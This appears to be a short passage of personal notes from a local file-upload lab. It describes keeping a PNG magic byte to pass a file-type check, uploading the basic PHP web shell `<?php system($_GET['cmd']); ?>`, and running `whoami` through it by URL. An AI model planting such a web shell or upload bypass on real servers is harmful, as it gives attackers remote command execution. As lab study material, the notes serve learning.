...
- **So how do we do it.**
	...
	-  Then we have to keep the file signature or the files **magicbyte** that is this `**PNG** `: ![[magic byte in a file 1.png]]
	...
	- Lets go with the basic php payload : `<?php system($_GET['cmd']); ?>
		- ![[after deleting the middle part 1.png]]
		- ![[file uploaded after deleting middle part 1.png]]
		-  And when i access cmdlab.php through url : 
			- ` http://localhost/labs/uploads/cmdlab.php?cmd=whoami `
			- ![[whoami output in file upload lab 0x02 1.png]]
